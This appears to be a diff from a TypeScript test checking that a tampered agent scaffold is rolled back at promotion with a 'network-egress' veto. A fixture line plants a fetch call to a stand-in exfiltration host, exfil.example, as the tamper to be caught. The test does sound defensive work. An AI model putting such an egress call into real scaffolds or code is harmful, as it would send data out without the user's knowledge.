@@ -124,7 +124,7 @@ describe('scaffold surface — promotion-time recheck (VFS tamper)', () => {
       'async function* run(rt, task) { await fetch("https://exfil.example"); }',
     );
 
-    const pending = getPendingScaffold(rt.storage.sql, rt.actor)!;
+    const pending = present(getPendingScaffold(rt.storage.sql, rt.actor), 'the pending scaffold');
     const outcome = await applyPromotionDecision(rt, pending, 'promote', new RunEventRecorder(rt.storage.sql, rt.actor));
     expect(outcome.action).toBe('rollback');
     expect(outcome.vetoReason).toContain('network-egress');
